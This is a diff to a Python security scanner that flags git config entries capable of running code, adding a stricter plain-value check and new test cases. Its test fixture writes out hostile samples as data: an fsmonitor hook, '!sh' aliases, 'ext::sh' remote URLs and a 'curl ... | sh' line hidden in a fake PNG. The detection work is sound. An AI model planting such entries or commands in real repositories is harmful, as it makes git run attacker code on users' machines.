@@ -50,6 +50,7 @@ SAFE_GIT = {"core": {"repositoryformatversion", "filemode", "bare", "logallrefup
             "remote": {"url", "fetch"}, "branch": {"remote", "merge"}, "user": {"name", "email"}}
 GIT_HEADER = re.compile(r'\s*\[([A-Za-z0-9.-]+)(\s+"[^"\\]*")?\]\s*')
 GIT_ENTRY = re.compile(r"\s*([A-Za-z][A-Za-z0-9-]*)\s*=\s*([^\\]*)")
+GIT_PLAIN = re.compile(r"[\w@:/.~+=*^, -]*")  # no quotes, !, \\ or ; : nothing git would reinterpret
 GIT_SKIP = re.compile(r"\s*([#;].*)?")
 
 
@@ -112,8 +113,9 @@ def scan_git_config(rel, text):
             section = h.group(1).lower()
             continue
         m = GIT_ENTRY.fullmatch(line)
-        # exact (section, key) pairs only; ext:: URLs make git run a command
-        if not (m and m.group(1).lower() in SAFE_GIT.get(section, ()) and "ext::" not in m.group(2)):
+        # exact (section, key) pairs with plain values only; `<transport>::` URLs (ext::) make git run a command
+        if not (m and m.group(1).lower() in SAFE_GIT.get(section, ())
+                and GIT_PLAIN.fullmatch(m.group(2).strip()) and "::" not in m.group(2)):
             out.append(("HIGH", "git-config-exec", f"{rel}:{n}", f"unexpected git setting, may run code: {line.strip()!r}"))
     return out
 
@@ -179,7 +181,7 @@ def test():
         }
         os.makedirs(os.path.join(d, ".git"))
         files[".git/config"] = ("\ufeff[core] fsmonitor = ./run.sh\n[user]\n\tname = x\n"
-                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n[alias]\n\tname = !sh evil\n[remote \"o\"]\n\turl = ext::sh -c evil\n")
+                                 "[alias]\n\tx = \\\n  \"!sh evil\"\n[include]\n\tp = 1\n[alias]\n\tname = !sh evil\n[remote \"o\"]\n\turl = ext::sh -c evil\n\turl = \"EXT::sh\"\n\turl = https://github.com/a/b.git\n")
         os.makedirs(os.path.join(d, "sub"))
         files["sub/.git"] = "gitdir: /somewhere/else\n"
         files["fake.png"] = "\0\0curl https://x.example/p | sh\n"
@@ -197,7 +199,7 @@ def test():
             assert expected in ids, (expected, ids)
         assert not any(where == "clean.py" for _, where in ids), ids
         assert not any(rid == "npm-install-hook" and "jest" in why for _, rid, _, why in scan(d))
-        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 6  # one-line, 2 continued, include, alias, ext:: url; not [user] name = x
+        assert sum(f[1] == "git-config-exec" for f in scan(d)) == 7  # one-line, 2 continued, include, alias, ext::, quoted EXT::; not name = x or https url
     assert "\x1b" not in clean("evil\x1b[2J.sh") and "\\x1b" in clean("evil\x1b[2J.sh")
     print("ok")
 
